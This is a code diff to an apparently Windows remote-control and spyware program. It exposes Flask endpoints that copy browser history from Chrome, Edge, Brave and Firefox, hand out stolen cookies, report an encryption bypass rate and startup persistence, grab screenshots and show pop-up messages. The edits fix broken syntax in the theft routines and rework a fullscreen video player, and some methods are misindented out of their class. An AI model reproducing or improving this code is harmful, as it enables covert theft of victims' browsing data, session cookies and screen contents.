@@ -669,17 +669,22 @@ Encryption bypass rate: {(decrypted_count/len(cookies)*100):.1f}%
 {chr(10).join(f"  {domain}: {count}" for domain, count in sorted(domains.items(), key=lambda x: x[1], reverse=True)[:10])}"""
         return summary
 
-    def cleanup(self):
-        if hasattr(self, 'temp_tool_dir') and self.temp_tool_dir and os.path.exists(self.temp_tool_dir):
-            try:
-                shutil.rmtree(self.temp_tool_dir)
-            except Exception as e:
-                pass
+def cleanup(self):
+    if hasattr(self, 'temp_tool_dir') and self.temp_tool_dir and os.path.exists(self.temp_tool_dir):
+        try:
+            shutil.rmtree(self.temp_tool_dir)
+        except Exception as e:
+            pass
 
-    def __del__(self):
-        self.cleanup()
+def __del__(self):
+    self.cleanup()
 
 extractor = None
+def execute():
+    if not is_admin():
+        print("Program isn't running with admin privileges.")
+    else:
+        print("Program is running with admin privileges.")
 
 def play_video_fullscreen_blocking(video_path):
     import cv2
@@ -731,24 +736,34 @@ def play_video_fullscreen_blocking(video_path):
         
         print(f"Loading video: {video_path}")
         
+        # Force quit any existing mixer first
+        try:
+            pygame.mixer.quit()
+            pygame.quit()
+        except:
+            pass
+        
+        time.sleep(0.5)
+        
         # Load video
         video = VideoFileClip(video_path)
         has_audio = video.audio is not None
-        print(f"Video loaded. Has audio: {has_audio}")
+        video_duration = video.duration
+        print(f"Video loaded. Has audio: {has_audio}, Duration: {video_duration}s")
         
-        # Extract audio with WAV format (more compatible)
+        # Extract audio with WAV format
         if has_audio:
             try:
                 temp_dir = tempfile.gettempdir()
-                # Try WAV first (no codec issues)
                 temp_audio = os.path.join(temp_dir, f"temp_audio_{int(time.time())}.wav")
                 
                 print("Extracting audio as WAV...")
-                video.audio.write_audiofile(temp_audio, verbose=False, logger=None)
+                video.audio.write_audiofile(temp_audio, codec='pcm_s16le', logger=None)
                 
                 if not os.path.exists(temp_audio) or os.path.getsize(temp_audio) == 0:
                     print("Audio extraction failed")
                     has_audio = False
+                    temp_audio = None
                 else:
                     print(f"Audio extracted: {temp_audio} ({os.path.getsize(temp_audio)} bytes)")
                 
@@ -757,26 +772,20 @@ def play_video_fullscreen_blocking(video_path):
                 import traceback
                 traceback.print_exc()
                 has_audio = False
+                temp_audio = None
         
-        # Initialize pygame mixer
-        if has_audio:
+        # Initialize pygame mixer ONLY if we have audio
+        if has_audio and temp_audio:
             try:
-                # Force quit any existing mixer
-                try:
-                    pygame.mixer.quit()
-                    pygame.quit()
-                except:
-                    pass
-                
-                time.sleep(0.3)
-                
-                # Initialize pygame completely
+                # Initialize pygame
                 pygame.init()
-                pygame.mixer.init(frequency=22050, size=-16, channels=2, buffer=512)
+                pygame.mixer.init(frequency=44100, size=-16, channels=2, buffer=2048)
+                
+                time.sleep(0.2)
                 
                 print("Pygame initialized successfully")
                 
-                # Load and test audio
+                # Load audio
                 pygame.mixer.music.load(temp_audio)
                 pygame.mixer.music.set_volume(1.0)
                 
@@ -815,38 +824,59 @@ def play_video_fullscreen_blocking(video_path):
             fps = 30
         delay = int(1000/fps)
         
-        print(f"Video FPS: {fps}, delay: {delay}ms")
+        total_frames = int(cap.get(cv2.CAP_PROP_FRAME_COUNT))
         
-        # Start audio
-        if has_audio:
-            try:
-                pygame.mixer.music.play()
-                time.sleep(0.2)
-                
-                if pygame.mixer.music.get_busy():
-                    print("✓ AUDIO PLAYING")
-                else:
-                    print("✗ Audio not playing")
-                    # Try to restart
-                    pygame.mixer.music.play()
-                    time.sleep(0.1)
-                    if pygame.mixer.music.get_busy():
-                        print("✓ Audio started on retry")
-                    
-            except Exception as play_error:
-                print(f"Playback error: {play_error}")
+        print(f"Video FPS: {fps}, delay: {delay}ms, total frames: {total_frames}")
         
-        # Playback loop
+        # Playback loop with sync
         frame_count = 0
-        start_time = time.time()
+        playback_start_time = time.time()
+        audio_started = False
+        sync_check_interval = 30  # Check sync every 30 frames
+        max_desync_threshold = 0.1  # 100ms desync threshold
         
         print("Starting playback...")
         
         while cap.isOpened():
+            loop_start = time.time()
+            
             ret, frame = cap.read()
             if not ret:
                 break
             
+            # Calculate current video position based on frame count
+            video_position = frame_count / fps
+            
+            # Start audio synchronized with video
+            if has_audio and not audio_started and frame_count == 0:
+                pygame.mixer.music.play()
+                audio_start_time = time.time()
+                audio_started = True
+                print("✓ AUDIO STARTED")
+            
+            # Periodic sync check
+            if has_audio and audio_started and frame_count % sync_check_interval == 0 and frame_count > 0:
+                # Calculate actual elapsed time
+                actual_elapsed = time.time() - playback_start_time
+                
+                # Calculate audio position (pygame doesn't provide direct position, so we estimate)
+                audio_position = actual_elapsed
+                
+                # Calculate desync
+                desync = abs(video_position - audio_position)
+                
+                if desync > max_desync_threshold:
+                    print(f"⚠ Desync detected: {desync:.3f}s at frame {frame_count}")
+                    # Restart audio at correct position
+                    try:
+                        pygame.mixer.music.stop()
+                        pygame.mixer.music.play(start=video_position)
+                        print(f"✓ Audio resynced to {video_position:.2f}s")
+                    except:
+                        # If start parameter doesn't work, just restart
+                        pygame.mixer.music.play()
+            
+            # Display frame
             screen_width, screen_height = pyautogui.size()
             frame = cv2.resize(frame, (screen_width, screen_height))
             cv2.imshow("___FULLSCREEN_VIDEO___", frame)
@@ -857,17 +887,28 @@ def play_video_fullscreen_blocking(video_path):
                 except:
                     pass
             
-            # Audio check
-            if has_audio and frame_count % 50 == 0:
+            # Audio status check
+            if has_audio and audio_started and frame_count % 50 == 0:
                 if not pygame.mixer.music.get_busy():
-                    print(f"⚠ Audio stopped at frame {frame_count}")
+                    print(f"⚠ Audio stopped at frame {frame_count}, restarting...")
+                    try:
+                        pygame.mixer.music.play(start=video_position)
+                    except:
+                        pygame.mixer.music.play()
             
-            if cv2.waitKey(delay) & 0xFF == 27:
+            # Handle timing to maintain frame rate
+            if cv2.waitKey(1) & 0xFF == 27:
                 continue
             
             frame_count += 1
+            
+            # Precise frame timing
+            loop_elapsed = (time.time() - loop_start) * 1000  # Convert to ms
+            sleep_time = max(1, delay - int(loop_elapsed))
+            if sleep_time > 1:
+                time.sleep(sleep_time / 1000.0)
         
-        elapsed = time.time() - start_time
+        elapsed = time.time() - playback_start_time
         print(f"Finished: {frame_count} frames in {elapsed:.2f}s")
         
         return True, f"Video played ({frame_count} frames, {elapsed:.2f}s)"
@@ -885,6 +926,7 @@ def play_video_fullscreen_blocking(video_path):
         try:
             if has_audio and pygame.mixer.get_init():
                 pygame.mixer.music.stop()
+                time.sleep(0.2)
                 pygame.mixer.quit()
                 pygame.quit()
                 print("Audio stopped")
@@ -2006,12 +2048,12 @@ Startup Persistence: {'✅' if startup_added else '❌'}"""
                 }
                 path = browser_paths.get(browser)
                 if path and os.path.exists(path):
-                    history_files = [];
+                    history_files = []
                     for root, dirs, files in os.walk(path):
                         if ("Extensions" in root):
-                            continue;
+                            continue
                         if ("History" in files):
-                            history_files.push(os.path.join(root, "History"))
+                            history_files.append(os.path.join(root, "History"))
 
                     for history_file in history_files:
                         try:
@@ -2019,19 +2061,19 @@ Startup Persistence: {'✅' if startup_added else '❌'}"""
                             shutil.copy2(history_file, temp_db)
                             conn = sqlite3.connect(temp_db)
                             cursor = conn.cursor()
-                            cursor.execute("SELECT urls.url, urls.title, visits.visit_time FROM urls JOIN visits ON urls.id = visits.url ORDER BY visits.visit_time DESC");
+                            cursor.execute("SELECT urls.url, urls.title, visits.visit_time FROM urls JOIN visits ON urls.id = visits.url ORDER BY visits.visit_time DESC")
                             
                             for (url, title, visit_time) in cursor.fetchall():
-                                timestamp = datetime(1601, 1, 1) + timedelta(microseconds=visit_time);
-                                history.push({
+                                timestamp = datetime(1601, 1, 1) + timedelta(microseconds=visit_time)
+                                history.append({
                                     'browser': browser,
                                     'url': url,
                                     'title': title if title else '[No Title]',
                                     'timestamp': timestamp.strftime('%Y-%m-%d %H:%M:%S'),
                                     'visit_time': visit_time
-                                });
-                            conn.close();
-                            os.remove(temp_db);
+                                })
+                            conn.close()
+                            os.remove(temp_db)
                         except Exception:
                             continue
             elif browser == "firefox":
@@ -2048,28 +2090,28 @@ Startup Persistence: {'✅' if startup_added else '❌'}"""
                             
                             for url, title, visit_time in cursor.fetchall():
                                 timestamp = datetime(1970, 1, 1) + timedelta(microseconds=visit_time)
-                                history.push({
+                                history.append({
                                     'browser': 'firefox',
                                     'url': url,
                                     'title': title if title else '[No Title]',
                                     'timestamp': timestamp.strftime('%Y-%m-%d %H:%M:%S'),
                                     'visit_time': visit_time
-                                });
-                            conn.close();
-                            os.remove(temp_db);
+                                })
+                            conn.close()
+                            os.remove(temp_db)
                         except Exception:
                             continue
             if (history.length > 0):
-                return jsonify({'success': True, 'result': history.slice(0, 50)});
+                return jsonify({'success': True, 'result': history.slice(0, 50)})
             else:
-                return jsonify({'success': False, 'error': 'No history found'});
+                return jsonify({'success': False, 'error': 'No history found'})
         
         else:
-            return jsonify({'success': False, 'error': f'Unknown command: {command}'});
+            return jsonify({'success': False, 'error': f'Unknown command: {command}'})
         
     
     except Exception as e:
-        return jsonify({'success': False, 'error': str(e)});
+        return jsonify({'success': False, 'error': str(e)})
 
 @app.route('/api/msg', methods=['POST'])
 def api_msg():
@@ -2080,7 +2122,7 @@ def api_msg():
             
         message = data.get('message', '')
         if message:
-            sanitized_msg = message.replace('"', '""');
+            sanitized_msg = message.replace('"', '""')
             vbs_script = f'MsgBox "{sanitized_msg}", vbExclamation, "Message from Web"'
             temp_vbs = os.path.join(os.getenv("TEMP"), "web_msg.vbs")
             with open(temp_vbs, "w", encoding="utf-16") as f:
@@ -2098,7 +2140,7 @@ def api_screen():
         screenshot = pyautogui.screenshot()
         img_bytes = io.BytesIO()
         screenshot.save(img_bytes, format="PNG")
-        img_bytes.seek(0);
+        img_bytes.seek(0)
         
         temp_file = os.path.join(os.getenv('TEMP'), 'screenshot.png')
         screenshot.save(temp_file, "PNG")
@@ -2169,46 +2211,46 @@ def api_download_cookies():
 @app.route('/api/download_history', methods=['GET'])
 def api_download_history():
     try:
-            all_history = [];
+            all_history = []
             
             browsers = {
                 "chrome": os.path.join(getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
                 "edge": os.path.join(getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
                 "brave": os.path.join(getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
-            };
+            }
 
             for browser_name, browser_path in browsers.items():
                 if os.path.exists(browser_path):
-                    history_files = [];
+                    history_files = []
                     for root, dirs, files in os.walk(browser_path):
                         if ("Extensions" in root):
-                            continue;
+                            continue
                         if ("History" in files):
-                            history_files.push(os.path.join(root, "History"))
+                            history_files.append(os.path.join(root, "History"))
 
                     for history_file in history_files:
                         try:
                             temp_db = os.path.join(getenv("TEMP"), f"temp_history_{browser_name}.db")
                             shutil.copy2(history_file, temp_db)
                             conn = sqlite3.connect(temp_db)
-                            cursor = conn.cursor();
-                            cursor.execute("SELECT urls.url, urls.title, visits.visit_time FROM urls JOIN visits ON urls.id = visits.url ORDER BY visits.visit_time DESC");
+                            cursor = conn.cursor()
+                            cursor.execute("SELECT urls.url, urls.title, visits.visit_time FROM urls JOIN visits ON urls.id = visits.url ORDER BY visits.visit_time DESC")
                             
                             for (url, title, visit_time) in cursor.fetchall():
-                                timestamp = datetime(1601, 1, 1) + timedelta(microseconds=visit_time);
-                                all_history.push({
+                                timestamp = datetime(1601, 1, 1) + timedelta(microseconds=visit_time)
+                                all_history.append({
                                     'browser': browser_name,
                                     'url': url,
                                     'title': title if title else '[No Title]',
                                     'timestamp': timestamp.strftime('%Y-%m-%d %H:%M:%S'),
                                     'visit_time': visit_time
-                                });
+                                })
                             
                             
-                            conn.close();
-                            os.remove(temp_db);
+                            conn.close()
+                            os.remove(temp_db)
                         except Exception as e:
-                            continue;
+                            continue
         
                 firefox_path = os.path.join(getenv("APPDATA"), "Mozilla", "Firefox", "Profiles")
                 if os.path.exists(firefox_path):
@@ -2223,23 +2265,23 @@ def api_download_history():
                             
                             for url, title, visit_time in cursor.fetchall():
                                 timestamp = datetime(1970, 1, 1) + timedelta(microseconds=visit_time)
-                                all_history.push({
+                                all_history.append({
                                     'browser': 'firefox',
                                     'url': url,
                                     'title': title if title else '[No Title]',
                                     'timestamp': timestamp.strftime('%Y-%m-%d %H:%M:%S'),
                                     'visit_time': visit_time
-                                });
-                            conn.close();
-                            os.remove(temp_db);
+                                })
+                            conn.close()
+                            os.remove(temp_db)
                         except Exception:
                             continue
                 if (all_history):
-                    temp_file = os.path.join(os.getenv('TEMP'), 'browser_history_complete.json');
+                    temp_file = os.path.join(os.getenv('TEMP'), 'browser_history_complete.json')
                     with open(temp_file, 'w', encoding='utf-8') as f:
-                        json.dump(all_history, f, indent=2, ensure_ascii=False);
-                    
-                    return send_file(temp_file, as_attachment=True, download_name='browser_history_complete.json');
+                        json.dump(all_history, f, indent=2, ensure_ascii=False)
+
+                    return send_file(temp_file, as_attachment=True, download_name='browser_history_complete.json')
                 else:
                     return jsonify({'success': False, 'error': 'No history found'}), 404
     except Exception as e:
@@ -2458,7 +2500,7 @@ def api_unmute_volume():
 if __name__ == "__main__":
     try:
         # Load saved config if exists
-        load_config();
+        load_config()
         if __name__ == "__main__":
             try:
                 # Load saved config if exists
